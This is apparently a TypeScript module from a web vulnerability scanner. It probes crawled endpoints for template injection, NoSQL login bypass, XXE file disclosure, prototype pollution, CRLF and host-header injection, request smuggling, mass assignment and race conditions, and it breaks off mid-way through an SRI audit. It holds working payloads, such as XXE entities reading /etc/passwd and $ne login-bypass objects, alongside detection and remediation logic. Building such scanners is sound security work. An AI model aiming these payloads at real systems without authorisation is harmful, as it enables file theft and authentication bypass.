/**
 * Advanced injection probes — built-in. Covers attack classes the
 * "active-injection" file doesn't:
 *
 *   - SSTI (Server-Side Template Injection): Jinja2/Twig/Handlebars/Velocity/Freemarker
 *     by sending arithmetic that ONLY a template engine evaluates server-side.
 *   - NoSQL injection: MongoDB-style operators in JSON params (no-quote login bypass).
 *   - XXE (XML External Entity): POST XML body with external SYSTEM entity to
 *     a canary host; we score "definitely vulnerable" only when the body of
 *     our local /etc/passwd-shaped probe leaks back. (Out-of-band detection
 *     would need an oracle service, out of scope.)
 *   - Prototype pollution: JSON body containing `__proto__.polluted=…` and
 *     a follow-up read that reflects the polluted value.
 *   - CRLF injection: header value with `\r\nX-Injected: 1`, look for the
 *     injected header in the response.
 *   - Host-header injection: arbitrary Host header, watch for that host in
 *     password-reset / "absolute URL" responses.
 *
 * All probes are gated by the SiteMap (we only fuzz endpoints the crawler
 * actually saw, and forms that accept JSON / XML).
 */

import { randomBytes } from "node:crypto";
import { draft, type Scanner } from "../../engine/scanner";
import { safeUrl, truncate } from "../common";
import { sameSite } from "../../web/url-hygiene";
import { loadSiteMap } from "../../web/sitemap";
import { BrowsingSession } from "../../web/session";
import { isNonSignal, stableRedirect, measureBaseline, exceedsNoise, type ProbeResp } from "./_oracle";

/** Cookie names that mark an authenticated session (vs tracking/device ids). */
const AUTH_COOKIE_HINT = /(sess|sid|auth|token|jwt|login|remember|logged|_session)/i;

// ───────────────────────────── SSTI ──────────────────────────────
// Each engine has a unique fingerprint expression. Math chosen so that the
// expected output is exact and unlikely to appear by chance in normal pages.
const SSTI_PROBES: { engine: string; payload: string; expect: RegExp }[] = [
  // 7 * 191 = 1337 chosen because 1337 has cultural recognition value and is
  // unlikely to appear "naturally" in unrelated pages.
  { engine: "jinja2/twig",  payload: "{{7*191}}",       expect: /\b1337\b/ },
  { engine: "jinja2/twig",  payload: "${7*191}",        expect: /\b1337\b/ },
  { engine: "freemarker",   payload: "${7*191}",        expect: /\b1337\b/ },
  { engine: "velocity",     payload: "#set($x=7*191)$x",expect: /\b1337\b/ },
  // NOTE: no "presence-only" (expect empty body) probe — `/^$/` matches a
  // blocked/empty WAF response and fired a critical on every param. Every probe
  // now requires the evaluated value `1337` to actually appear.
  // Smarty: `{$var}` with arithmetic.
  { engine: "smarty",       payload: "{math equation=\"7*191\"}",     expect: /\b1337\b/ },
  // ERB / Ruby: <%= 7*191 %>
  { engine: "erb",          payload: "<%= 7*191 %>",     expect: /\b1337\b/ },
  // Razor: @(7*191)
  { engine: "razor",        payload: "@(7*191)",         expect: /\b1337\b/ },
];

export const sstiScanner: Scanner = {
  id: "web.ssti",
  name: "SSTI (Server-Side Template Injection)",
  kind: "web",
  description: "Fingerprints Jinja2 / Twig / Freemarker / Velocity / Smarty / ERB / Razor / Handlebars by injecting unique arithmetic into URL parameters and watching for evaluated output.",
  defaultEnabled: false,
  async tool() {
    return { id: "web.ssti", name: "SSTI", kind: "web", backend: "builtin", status: "available", description: "Built-in template-injection fingerprinter." };
  },
  async run(ctx) {
    const seed = safeUrl(ctx.target.value);
    if (!seed) return;
    const map = await loadSiteMap(ctx.scanId);
    const session = new BrowsingSession(seed.origin, ctx.target.auth?.headers ?? {});
    const targets: { url: URL; params: string[] }[] = [];
    if (map) {
      for (const p of map.pages) {
        const u = safeUrl(p.url); if (!u) continue;
        const params = [...u.searchParams.keys()];
        if (params.length) targets.push({ url: u, params });
      }
    }
    if (!targets.length) targets.push({ url: seed, params: [...seed.searchParams.keys()] });
    if (!targets[0]?.params.length) { await ctx.progress(1, "no params"); return; }

    let done = 0; const total = targets.reduce((a, t) => a + t.params.length * SSTI_PROBES.length, 0);
    for (const { url, params } of targets) {
      for (const p of params) {
        // Baseline with a benign value: if "1337" already appears on the page
        // (a port, an id, a view-count, leetspeak) we cannot attribute it to our
        // arithmetic — skip this param rather than emit a phantom critical.
        try {
          const bu = new URL(url.toString());
          bu.searchParams.set(p, "mobassti");
          const br = await session.fetch(bu.toString(), { signal: ctx.signal });
          if (/\b1337\b/.test(br.body)) continue;
        } catch { /* tolerate — proceed */ }
        for (const probe of SSTI_PROBES) {
          if (ctx.signal.aborted) break;
          const u = new URL(url.toString());
          u.searchParams.set(p, probe.payload);
          let r;
          try { r = await session.fetch(u.toString(), { signal: ctx.signal }); } catch { done++; continue; }
          done++;
          if (done % 6 === 0) await ctx.progress(done / Math.max(total, 1), `${probe.engine} on ${p}`);
          if (r.body.length > 0 && probe.expect.test(r.body)) {
            await ctx.emit(draft({
              severity: "critical", confidence: "high",
              title: `SSTI (${probe.engine}) on parameter "${p}"`,
              description: `Payload \`${probe.payload}\` evaluated server-side — full RCE in most ${probe.engine} sandboxes.`,
              ruleId: `ssti/${probe.engine.replace(/[\\/]/g, "-")}`,
              cwe: ["CWE-1336", "CWE-94"], owasp: ["A03:2021"],
              location: { url: u.toString(), snippet: p },
              evidence: { engine: probe.engine, payload: probe.payload, snippet: truncate(r.body, 400) },
              remediation: "Don't render untrusted data through the template engine. If unavoidable, use a sandboxed engine or escape input as data, never as a template.",
              references: ["https://portswigger.net/research/server-side-template-injection"],
            }));
            break; // one engine match per param is enough.
          }
        }
      }
    }
    await ctx.progress(1, `${done} SSTI probes`);
  },
};

// ──────────────────────── NoSQL Injection ────────────────────────
const NOSQL_PROBES = [
  { kind: "auth-bypass-json", body: { username: { $ne: null }, password: { $ne: null } }, label: "$ne object" },
  { kind: "auth-bypass-json", body: { username: { $gt: "" }, password: { $gt: "" } }, label: "$gt object" },
  { kind: "regex-bypass", body: { username: { $regex: ".*" }, password: { $regex: ".*" } }, label: "$regex object" },
];

export const nosqlScanner: Scanner = {
  id: "web.nosql",
  name: "NoSQL Injection (Mongo)",
  kind: "web",
  description: "Sends MongoDB operator objects to login-shaped POST endpoints (`{username:{$ne:null},password:{$ne:null}}`). Detects auth bypass when the response looks like success.",
  defaultEnabled: false,
  async tool() {
    return { id: "web.nosql", name: "NoSQL Injection", kind: "web", backend: "builtin", status: "available", description: "Built-in NoSQL ($ne / $gt / $regex) auth-bypass tester." };
  },
  async run(ctx) {
    const seed = safeUrl(ctx.target.value);
    if (!seed) return;
    const map = await loadSiteMap(ctx.scanId);
    if (!map) { await ctx.progress(1, "skipped"); return; }
    const loginForms = map.forms.filter((f) => f.looksLikeLogin && f.method === "POST");
    if (!loginForms.length) { await ctx.progress(1, "no login forms"); return; }
    const session = new BrowsingSession(seed.origin, ctx.target.auth?.headers ?? {});

    const baselineBody = { username: "doesnotexist__moba__", password: "wrongpassword" };
    const asResp = (r: { res: { status: number }; body: string; redirectChain: string[] }): ProbeResp =>
      ({ status: r.res.status, body: r.body, latencyMs: 0, redirect: r.redirectChain.length ? r.redirectChain[r.redirectChain.length - 1] : null });

    for (const form of loginForms) {
      if (ctx.signal.aborted) break;
      // Deny baseline (wrong STRING creds) — records the status, redirect, and
      // the cookies a FAILED login sets, so tracking cookies (present on every
      // request) can't later read as "bypassed".
      let baseResp: ProbeResp | null = null;
      const baselineCookieNames = new Set<string>();
      try {
        const rb = await session.fetch(form.action, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(baselineBody), signal: ctx.signal });
        baseResp = asResp(rb);
        for (const c of session.observedSetCookies) baselineCookieNames.add(c.raw.split("=")[0].trim());
      } catch { continue; }
      const baselineRedirect = stableRedirect(baseResp.redirect);

      for (const probe of NOSQL_PROBES) {
        if (ctx.signal.aborted) break;
        // Fresh session per probe so a NEW auth cookie is attributable.
        const s = new BrowsingSession(seed.origin, ctx.target.auth?.headers ?? {});
        let r;
        try {
          r = await s.fetch(form.action, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(probe.body), signal: ctx.signal });
        } catch { continue; }
        const resp = asResp(r);
        if (isNonSignal(resp, baseResp.status)) continue; // blocked/empty ≠ bypass
        const failureMarker = /invalid|denied|incorrect|wrong|not\s*found/i.test(r.body);
        const successMarker = /logout|sign\s*out|dashboard|welcome\s+[a-z0-9]|"success"\s*:\s*true/i.test(r.body);
        const newAuthCookie = s.observedSetCookies
          .map((c) => c.raw.split("=")[0].trim())
          .find((n) => AUTH_COOKIE_HINT.test(n) && !baselineCookieNames.has(n)) ?? null;
        const redirect = stableRedirect(resp.redirect);
        const redirectedToApp = !!redirect && redirect !== baselineRedirect && !/login|signin|sign-in|error|denied|unauthor/i.test(redirect);
        // AFFIRMATIVE: the typed-operator request produced an authenticated
        // outcome the string-cred deny baseline did not.
        const positive = !!newAuthCookie || (redirectedToApp && successMarker) || (successMarker && !failureMarker);
        if (resp.status < 400 && !failureMarker && positive) {
          await ctx.emit(draft({
            severity: "critical", confidence: "medium",
            title: `NoSQL injection auth bypass: ${probe.label} on ${form.action}`,
            description: `A JSON object with MongoDB operators (${probe.label}) produced an authenticated outcome (${newAuthCookie ? `new session cookie "${newAuthCookie}"` : redirectedToApp ? `redirect to ${redirect}` : "a logged-in page"}) that the wrong-credentials baseline did not.`,
            ruleId: "nosql/auth-bypass",
            cwe: ["CWE-943"], owasp: ["A03:2021"],
            location: { url: form.action, snippet: JSON.stringify(probe.body) },
            evidence: { baseline: { len: baseResp.body.length, status: baseResp.status, redirect: baselineRedirect, cookieNames: [...baselineCookieNames] }, probe: { len: resp.body.length, status: resp.status, redirect, newAuthCookie, snippet: truncate(r.body, 300) } },
            remediation: "Never trust client-controlled types. Cast username/password to strings before passing to the DB driver. Validate JSON shape with a schema.",
            references: ["https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html"],
          }));
        }
      }
    }
    await ctx.progress(1, "NoSQL probe done");
  },
};

// ─────────────────────────────── XXE ─────────────────────────────
// We only have local detection (response body must echo the entity content);
// out-of-band XXE needs an oracle service.
const XXE_PAYLOAD = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>`;
const XXE_WIN_PAYLOAD = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>`;

export const xxeScanner: Scanner = {
  id: "web.xxe",
  name: "XXE (XML External Entity)",
  kind: "web",
  description: "POSTs an XML body with external SYSTEM entities pointing at /etc/passwd or win.ini against endpoints that accept XML, and watches for entity expansion in the response.",
  defaultEnabled: false,
  async tool() {
    return { id: "web.xxe", name: "XXE", kind: "web", backend: "builtin", status: "available", description: "Built-in XXE local-file-disclosure tester." };
  },
  async run(ctx) {
    const seed = safeUrl(ctx.target.value);
    if (!seed) return;
    const map = await loadSiteMap(ctx.scanId);
    if (!map) { await ctx.progress(1, "skipped"); return; }
    const session = new BrowsingSession(seed.origin, ctx.target.auth?.headers ?? {});

    // Candidate endpoints: anything whose path/url hints at XML processing
    // (xml, soap, upload, receive), all POST forms, and all apiHints. We
    // POST XML to all of them — most non-XML endpoints will 4xx or ignore
    // and not match the detector pattern.
    const xmlEndpoints = new Set<string>();
    const XML_HINT = /(xml|soap|upload|receive|import|parse)/i;
    for (const p of map.pages) {
      const ct = (p.contentType ?? "").toLowerCase();
      if (ct.includes("xml") || ct.includes("soap") || XML_HINT.test(p.url)) xmlEndpoints.add(p.url);
    }
    for (const f of map.forms) if (f.method === "POST") xmlEndpoints.add(f.action);
    for (const a of map.apiHints) xmlEndpoints.add(a.url);
    if (!xmlEndpoints.size) { await ctx.progress(1, "no candidate endpoints"); return; }

    for (const url of xmlEndpoints) {
      if (ctx.signal.aborted) break;
      for (const payload of [XXE_PAYLOAD, XXE_WIN_PAYLOAD]) {
        let r;
        try {
          r = await session.fetch(url, {
            method: "POST",
            headers: { "content-type": "application/xml" },
            body: payload,
            signal: ctx.signal,
          });
        } catch { continue; }
        const hit =
          r.body.includes("root:x:0:0") ||
          /\[fonts\]|\[boot loader\]/.test(r.body);
        if (hit) {
          await ctx.emit(draft({
            severity: "critical", confidence: "high",
            title: `XXE on ${url}`,
            description: "XML parser resolved external SYSTEM entity → local file content disclosed in the response.",
            ruleId: "xxe/local-file",
            cwe: ["CWE-611"], owasp: ["A05:2021"],
            location: { url, snippet: payload.slice(0, 100) },
            evidence: { snippet: truncate(r.body, 400) },
            remediation: "Disable XML external entities and DOCTYPE on every parser instance (`setFeature('http://apache.org/xml/features/disallow-doctype-decl', true)` in Java; `libxml_disable_entity_loader(true)` in PHP <8; etc.).",
            references: ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
          }));
          break;
        }
      }
    }
    await ctx.progress(1, "XXE done");
  },
};

// ───────────────────── Prototype Pollution ──────────────────────
// Two-step: pollute via JSON body, then read same endpoint and look for the
// polluted property reflected. This catches common Express/Lodash/jQuery patterns.
export const protoPollutionScanner: Scanner = {
  id: "web.proto-pollution",
  name: "Prototype Pollution",
  kind: "web",
  description: "Sends `{__proto__: {polluted: <canary>}}` to JSON POST endpoints, then re-fetches and checks whether the canary leaks via Object.prototype.",
  defaultEnabled: false,
  async tool() {
    return { id: "web.proto-pollution", name: "Prototype Pollution", kind: "web", backend: "builtin", status: "available", description: "Built-in JS prototype-pollution tester." };
  },
  async run(ctx) {
    const seed = safeUrl(ctx.target.value);
    if (!seed) return;
    const map = await loadSiteMap(ctx.scanId);
    if (!map) { await ctx.progress(1, "skipped"); return; }
    const session = new BrowsingSession(seed.origin, ctx.target.auth?.headers ?? {});
    const canary = "moba_proto_" + randomBytes(4).toString("hex");

    // Candidates: every POST form, every JS-mined API hint, AND any sitemap
    // page whose URL matches /api/, /v\d/, /rest/, /graphql — those are the
    // shapes most likely to merge JSON bodies into shared state.
    const candidates = new Set<string>();
    for (const f of map.forms) if (f.method === "POST") candidates.add(f.action);
    for (const a of map.apiHints) candidates.add(a.url);
    for (const p of map.pages) {
      if (/\/(api|v\d|rest|graphql)\b/i.test(p.url)) candidates.add(p.url);
    }
    if (!candidates.size) { await ctx.progress(1, "no JSON endpoints"); return; }

    let done = 0;
    for (const url of candidates) {
      if (ctx.signal.aborted) break;
      done++;
      // 1) Pollute
      try {
        await session.fetch(url, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ __proto__: { polluted: canary }, "constructor": { "prototype": { polluted: canary } } }),
          signal: ctx.signal,
        });
      } catch { continue; }

      // 2) Re-fetch (same endpoint) — if response body now mentions canary,
      // server merged user input into a shared object.
      let r;
      try {
        r = await session.fetch(url, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ probe: 1 }),
          signal: ctx.signal,
        });
      } catch { continue; }
      if (r.body.includes(canary)) {
        await ctx.emit(draft({
          severity: "high", confidence: "medium",
          title: `Prototype pollution on ${url}`,
          description: `Sending JSON with __proto__.polluted=<canary> caused subsequent requests to expose that canary — every Object literal on the server now inherits the polluted property.`,
          ruleId: "proto-pollution/server-side",
          cwe: ["CWE-1321"], owasp: ["A08:2021"],
          location: { url, snippet: `__proto__.polluted=${canary}` },
          evidence: { canary, snippet: truncate(r.body, 300) },
          remediation: "Use `Object.create(null)` for parsed JSON, or recursive sanitization of `__proto__` / `constructor.prototype`. Upgrade vulnerable libs (lodash<4.17.21, jquery<3.4.0, etc.).",
          references: ["https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html"],
        }));
      }
    }
    await ctx.progress(1, `${done} proto-pollution probes`);
  },
};

// ─────────────────── CRLF + Host header injection ────────────────
export const crlfHostScanner: Scanner = {
  id: "web.crlf-host",
  name: "CRLF / Host Header Injection",
  kind: "web",
  description: "Tests parameters and the Host header for response-splitting (\\r\\n in value reflected as a real header) and for absolute-URL leakage with attacker-controlled Host (password-reset poisoning surface).",
  defaultEnabled: false,
  async tool() {
    return { id: "web.crlf-host", name: "CRLF / Host Header", kind: "web", backend: "builtin", status: "available", description: "Built-in CRLF response-splitting + host-header injection tester." };
  },
  async run(ctx) {
    const seed = safeUrl(ctx.target.value);
    if (!seed) return;
    const map = await loadSiteMap(ctx.scanId);
    const session = new BrowsingSession(seed.origin, ctx.target.auth?.headers ?? {});
    const canary = "moba" + randomBytes(3).toString("hex");

    // 1) CRLF in URL parameters (URL-encoded \r\n).
    const targets = (map?.pages ?? []).map((p) => p.url).concat(seed.toString());
    for (const u of new Set(targets)) {
      if (ctx.signal.aborted) break;
      const url = safeUrl(u); if (!url) continue;
      const params = [...url.searchParams.keys()];
      for (const p of params) {
        const probeUrl = new URL(url.toString());
        probeUrl.searchParams.set(p, `${url.searchParams.get(p) ?? "x"}%0d%0aX-Moba-Injected:${canary}`);
        let r;
        try { r = await session.fetch(probeUrl.toString().replace(/%2520/g, "%20"), { signal: ctx.signal }); }
        catch { continue; }
        if (r.res.headers.get("x-moba-injected") === canary) {
          await ctx.emit(draft({
            severity: "high", confidence: "high",
            title: `CRLF / response splitting on parameter "${p}"`,
            description: "Server placed our \\r\\n-containing value into a response header, allowing attackers to inject arbitrary headers (cache poisoning, Set-Cookie smuggling).",
            ruleId: "crlf/response-splitting",
            cwe: ["CWE-113"], owasp: ["A03:2021"],
            location: { url: probeUrl.toString(), snippet: p },
            evidence: { injectedHeader: "x-moba-injected", canary, status: r.res.status },
            remediation: "Strip CR/LF from any user-supplied value before it reaches a response header. Use a framework helper, never string concatenation.",
          }));
        }
      }
    }

    // 2) Host header injection — try seed AND any URL whose path looks like
    //    a "use the Host to build an absolute URL" candidate (password reset,
    //    confirm, verify, callback, magic-link). The crawler-discovered URL
    //    list gives us those.
    const evilHost = `evil${canary}.example`;
    const HOST_HINT = /(reset|confirm|verify|magic|invite|signup|callback|return|redirect)/i;
    const hostTargets = new Set<string>([seed.toString()]);
    if (map) {
      for (const p of map.pages) {
        if (HOST_HINT.test(p.url)) hostTargets.add(p.url);
      }
    }

    for (const url of hostTargets) {
      if (ctx.signal.aborted) break;
      let r;
      try {
        // Node's fetch silently ignores a user-provided `Host` header (undici
        // overrides it with the connection target). We test the practical
        // attack vector instead: `X-Forwarded-Host` and `Forwarded`, which
        // most reverse-proxy-aware apps trust for absolute-URL construction.
        r = await session.fetch(url, {
          headers: {
            "x-forwarded-host": evilHost,
            "x-forwarded-server": evilHost,
            "forwarded": `host=${evilHost};proto=https`,
          },
          signal: ctx.signal,
        });
      } catch { continue; }
      const dangerous =
        r.body.includes(evilHost) ||
        (r.res.headers.get("location") ?? "").includes(evilHost);
      if (dangerous) {
        await ctx.emit(draft({
          severity: "high", confidence: "medium",
          title: `Host header injection — server reflects attacker-controlled Host on ${url}`,
          description: "Server echoed the Host header into the response (or used it to construct an absolute URL). A common cause of password-reset link poisoning and cache poisoning.",
          ruleId: "host-header/reflection",
          cwe: ["CWE-444"], owasp: ["A05:2021"],
          location: { url, snippet: `Host: ${evilHost}` },
          evidence: { host: evilHost, snippet: truncate(r.body, 300), location: r.res.headers.get("location") },
          remediation: "Never trust Host header. Pin a canonical hostname in config and reject mismatches. For password-reset emails, build URLs from a server-side constant.",
        }));
      }
    }
    await ctx.progress(1, "CRLF / host probes done");
  },
};

// ────────────────── HTTP request smuggling (CL.TE) ────────────────
// We try a CL.TE smuggle and watch for evidence. This is intentionally
// conservative — only a delta in response time AND a response that mentions
// our smuggled request line scores a finding.
export const httpSmugglingScanner: Scanner = {
  id: "web.http-smuggling",
  name: "HTTP Request Smuggling (CL.TE)",
  kind: "web",
  description: "Sends a CL.TE smuggling probe (Content-Length + Transfer-Encoding: chunked) and watches for desync evidence (timing / response continuation). Conservative — only flags strong signals.",
  defaultEnabled: false,
  async tool() {
    return { id: "web.http-smuggling", name: "HTTP Smuggling", kind: "web", backend: "builtin", status: "available", description: "Built-in CL.TE request-smuggling probe." };
  },
  async run(ctx) {
    // Node's fetch normalizes headers — we can't reliably send a malformed
    // Content-Length + Transfer-Encoding combo through it. So we do a low-
    // signal heuristic instead: send TE: chunked and CL: 0, look for response
    // anomalies. The full smuggling test belongs to a raw-socket adapter
    // (TODO: lib/web/raw-http.ts).
    const seed = safeUrl(ctx.target.value);
    if (!seed) return;
    let r;
    try {
      r = await fetch(seed.toString(), {
        method: "POST",
        headers: { "transfer-encoding": "chunked", "content-length": "0", "content-type": "text/plain" },
        body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + seed.host + "\r\n\r\n",
        signal: ctx.signal,
      });
    } catch { return; }
    if (r.status === 400 || r.status === 421) {
      // Server rejected — that's the SAFE case.
      await ctx.progress(1, "rejected (good)");
      return;
    }
    // If the proxy answered 200 with admin-like content despite our garbage,
    // smuggling is plausible.
    const body = await r.text().catch(() => "");
    if (/admin|dashboard|welcome.*admin/i.test(body)) {
      // INFO only: request smuggling cannot actually be performed over fetch()
      // (undici normalizes headers and won't emit a desync payload), so this is
      // at best a hint that the front-end returned admin-shaped content — which
      // any homepage with an "Admin"/"Dashboard" nav link also does. Emitting
      // this as high produced guaranteed false positives; a real verdict needs a
      // raw-socket tool.
      await ctx.emit(draft({
        severity: "info", confidence: "low",
        title: "HTTP request smuggling: unconfirmed — re-test with a raw-socket tool",
        description: "The front-end returned admin/dashboard-shaped content to a malformed CL.TE request, but this cannot be confirmed over an HTTP client library. Verify with a raw-socket smuggling tool (e.g. smuggler.py / Burp) before treating it as real.",
        ruleId: "http-smuggling/clte-suspect",
        cwe: ["CWE-444"], owasp: ["A05:2021"],
        location: { url: seed.toString() },
        evidence: { snippet: truncate(body, 300), status: r.status, note: "cannot be confirmed via fetch/undici" },
        remediation: "Use HTTP/2 end-to-end. Reject ambiguous Content-Length + Transfer-Encoding headers. Patch the front-end proxy.",
        references: ["https://portswigger.net/web-security/request-smuggling"],
      }));
    }
    await ctx.progress(1, "HTTP smuggling probe done");
  },
};

// ───────────────────────── Mass assignment ────────────────────────
// For each POST form discovered, re-submit with extra fields the form didn't
// have (`isAdmin`, `role`, `is_active`, `email_verified`, `id`) and look for
// successful "accepted" responses.
const MASS_ASSIGN_FIELDS = ["isAdmin", "is_admin", "admin", "role", "roles", "is_active", "active", "email_verified", "verified", "id", "user_id", "uid", "balance", "credit"];

export const massAssignmentScanner: Scanner = {
  id: "web.mass-assignment",
  name: "Mass Assignment",
  kind: "web",
  description: "For each POST form in the SiteMap, re-submits with extra privileged-looking fields (`isAdmin`, `role`, `id`, `email_verified`, …). Flags forms that accept unexpected fields without rejection.",
  defaultEnabled: false,
  async tool() {
    return { id: "web.mass-assignment", name: "Mass Assignment", kind: "web", backend: "builtin", status: "available", description: "Built-in mass-assignment tester." };
  },
  async run(ctx) {
    const seed = safeUrl(ctx.target.value);
    if (!seed) return;
    const map = await loadSiteMap(ctx.scanId);
    if (!map) { await ctx.progress(1, "skipped"); return; }
    const session = new BrowsingSession(seed.origin, ctx.target.auth?.headers ?? {});
    const forms = map.forms.filter((f) => f.method === "POST" && !f.looksLikeLogin);
    if (!forms.length) { await ctx.progress(1, "no POST forms"); return; }

    for (const form of forms) {
      if (ctx.signal.aborted) break;
      const baselineBody = new URLSearchParams();
      for (const i of form.inputs) baselineBody.set(i.name, i.value || "x");
      // Measure the form's OWN response jitter by submitting it twice unchanged.
      // A form that embeds a CSRF token / timestamp / reflected count differs
      // by >50 B between any two POSTs — the old fixed threshold flagged that.
      const base = await measureBaseline(async () => {
        try {
          const r = await session.fetch(form.action, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: baselineBody.toString(), signal: ctx.signal });
          return { status: r.res.status, body: r.body, latencyMs: 0, redirect: null } as ProbeResp;
        } catch { return null; }
      }, 2);
      if (!base || base.unstable) continue;

      const probeBody = new URLSearchParams(baselineBody);
      for (const f of MASS_ASSIGN_FIELDS) probeBody.set(f, "1");
      let probe;
      try { probe = await session.fetch(form.action, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: probeBody.toString(), signal: ctx.signal }); }
      catch { continue; }
      if (isNonSignal({ status: probe.res.status, body: probe.body, latencyMs: 0, redirect: null }, base.status)) continue;

      // The extra fields "did something" only if the response moved beyond the
      // form's own jitter while the status held (a hard reject would change it).
      if (probe.res.status === base.status && exceedsNoise(probe.body.length - base.len, base.jitter)) {
        await ctx.emit(draft({
          severity: "medium", confidence: "low",
          title: `Possible mass assignment on ${form.action}`,
          description: `POST form's response shifted beyond its own jitter after adding ${MASS_ASSIGN_FIELDS.length} extra fields including \`isAdmin\`, \`role\`, \`id\` — server-side might be using allowlist-less object hydration. Confirm the privileged field was actually honored.`,
          ruleId: "mass-assignment/extra-fields",
          cwe: ["CWE-915"], owasp: ["A04:2021"],
          location: { url: form.action, snippet: MASS_ASSIGN_FIELDS.join(", ") },
          evidence: { baselineLen: base.len, jitter: base.jitter, probeLen: probe.body.length, status: probe.res.status, snippet: truncate(probe.body, 300) },
          remediation: "Define an explicit schema/allowlist for accepted fields per endpoint. Don't use `User.update(req.body)` style mass updates.",
          references: ["https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"],
        }));
      }
    }
    await ctx.progress(1, "mass assignment done");
  },
};

// ─────────────────────────── Race condition ───────────────────────
// Single-packet attack lite: fire N parallel POSTs and check if more than 1
// succeeded. We can only do this against sitemap POSTs that look "transactional"
// (transfer / redeem / vote / claim).
const RACE_HINT = /(transfer|withdraw|redeem|claim|vote|like|follow|reset|invite|coupon|promo)/i;

export const raceConditionScanner: Scanner = {
  id: "web.race-condition",
  name: "Race Condition (parallel-POST)",
  kind: "web",
  description: "Identifies state-changing POST forms (transfer / redeem / vote shaped paths) and fires N parallel requests. Flags endpoints whose successful-response count exceeds 1 (suggesting no atomic check).",
  defaultEnabled: false,
  async tool() {
    return { id: "web.race-condition", name: "Race Condition", kind: "web", backend: "builtin", status: "available", description: "Parallel-request race-condition tester." };
  },
  async run(ctx) {
    const seed = safeUrl(ctx.target.value);
    if (!seed) return;
    const map = await loadSiteMap(ctx.scanId);
    if (!map) { await ctx.progress(1, "skipped"); return; }
    const targets = map.forms.filter((f) => f.method === "POST" && RACE_HINT.test(f.action));
    if (!targets.length) { await ctx.progress(1, "no transactional endpoints"); return; }
    const headers = { ...(ctx.target.auth?.headers ?? {}) };

    for (const form of targets) {
      if (ctx.signal.aborted) break;
      const body = new URLSearchParams();
      for (const i of form.inputs) body.set(i.name, i.value || "1");
      const N = 10;
      const t0 = Date.now();
      const results = await Promise.all(Array.from({ length: N }, async () => {
        try {
          const r = await fetch(form.action, {
            method: "POST",
            headers: { ...headers, "content-type": "application/x-www-form-urlencoded" },
            body: body.toString(),
            signal: ctx.signal,
          });
          const text = await r.text().catch(() => "");
          return { ok: r.status >= 200 && r.status < 300, status: r.status, text };
        } catch { return { ok: false, status: 0, text: "" }; }
      }));
      const ms = Date.now() - t0;
      const successes = results.filter((r) => r.ok).length;
      // A race is only meaningful if the endpoint ENFORCES single-use — i.e.
      // some requests were rejected as duplicate/limit — yet more than one still
      // slipped through. An endpoint that accepts ALL N is simply idempotent (a
      // re-votable poll, a like toggle), not a race; flagging that is a false
      // positive.
      const limited = results.filter((r) => !r.ok && (r.status === 409 || r.status === 429 || /already|duplicate|limit|exceeded|too\s*many|only\s*once|in\s*use/i.test(r.text))).length;
      if (successes >= 2 && limited >= 1) {
        await ctx.emit(draft({
          severity: "high", confidence: "low",
          title: `Possible race condition on ${form.action} — ${successes}/${N} parallel POSTs succeeded despite ${limited} rate/duplicate rejection(s)`,
          description: `Sent ${N} parallel POSTs to a transactional endpoint. ${limited} were rejected as duplicate/limit-exceeded — so the endpoint DOES enforce single-use — yet ${successes} still succeeded, indicating a non-atomic check. Combined with state mutation this enables double-spend / double-vote / coupon-stacking.`,
          ruleId: "race-condition/parallel",
          cwe: ["CWE-362", "CWE-367"], owasp: ["A04:2021"],
          location: { url: form.action },
          evidence: { successes, limited, total: N, totalMs: ms, statuses: results.map((r) => r.status) },
          remediation: "Wrap the state mutation in an atomic DB transaction with proper SELECT FOR UPDATE / unique-constraint checks. Use idempotency keys for retries.",
          references: ["https://portswigger.net/research/smashing-the-state-machine"],
        }));
      }
    }
    await ctx.progress(1, "race condition probes done");
  },
};

// ──────────────────────────── SRI check ───────────────────────────
// On the seed page, look for <script src="https://..."> from third-party
// origins WITHOUT an `integrity` attribute. That's an A08 supply-chain risk.
const SCRIPT_TAG = /<script\b([^>]*)>/gi;
const ATTR_PARSE = /\b(\w+)\s*=\s*("[^"]*"|'[^']*'|\S+)/g;

export const sriScanner: Scanner = {
  id: "web.sri",
  name: "Subresource Integrity (SRI) Audit",
  kind: "web",
  description: "Walks every page in the SiteMap; flags `<script src>` and `<link rel=stylesheet href>` loading from a different origin without an `integrity=` attribute. Maps to OWASP A08:2021.",
  defaultEnabled: true,
  async tool() {
    return { id: "web.sri", name: "SRI Audit", kind: "web", backend: "builtin", status: "available", description: "Built-in SRI / supply-chain integrity audit." };
  },
  async run(ctx) {
    const seed = safeUrl(ctx.target.value);
    if (!seed) return;
    const map = await loadSiteMap(ctx.scanId);
    if (!map) { await ctx.progress(1, "no sitemap"); return; }
    const session = new BrowsingSession(seed.origin, ctx.target.auth?.headers ?? {});

    const seenScripts = new Map<string, { onPages: string[]; integrity: boolean }>();
    let pagesChecked = 0;
    for (const p of map.pages) {
      if (ctx.signal.aborted) break;
      if (!(p.contentType ?? "").includes("html")) continue;
      let r;
      try { r = await session.fetch(p.url, { signal: ctx.signal }); } catch { continue; }
      pagesChecked += 1;
      for (const m of r.body.matchAll(SCRIPT_TAG)) {
        const attrs: Record<string, string> = {};
        for (const a of m[1].matchAll(ATTR_PARSE)) {
          attrs[a[1].toLowerCase()] = a[2].replace(/^['"]|['"]$/g, "");
        }
        const src = attrs["src"]; if (!src) continue;
        let abs: URL; try { abs = new URL(src, p.url); } catch { continue; }
        // Same-SITE (registrable domain), not same-origin: a site's own CDN
        // subdomains (cdn./assets./static.example.com) are first-party and must
        // not be flagged as "third-party".
        if (sameSite(abs.hostname, seed.hostname)) continue;
